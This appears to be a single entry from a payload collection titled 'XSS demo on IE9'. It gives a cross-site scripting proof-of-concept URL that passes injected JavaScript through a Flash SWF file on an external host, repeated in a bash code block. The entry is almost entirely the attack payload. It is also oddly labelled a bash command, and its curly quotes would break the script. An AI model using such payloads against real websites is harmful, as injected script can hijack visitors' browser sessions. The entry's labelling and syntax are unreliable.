---
id: 7404d167-0666-45b8-9003-697032f25a72
name: XSS demo on IE9
type: command
executor: bash
data: http://0me.me/demo/xss/xssproject.swf?js=w=window.open(‘invalidfileinvalidfileinvalidfile’,’target’);setTimeout(‘alert(w.document.location);w.close();’,1);
output: null
created_at: '2023-04-06T03:56:42.101208+00:00'
updated_at: '2023-04-10T20:21:40.578602+00:00'
---

# XSS demo on IE9

```bash
http://0me.me/demo/xss/xssproject.swf?js=w=window.open(‘invalidfileinvalidfileinvalidfile’,’target’);setTimeout(‘alert(w.document.location);w.close();’,1);
```


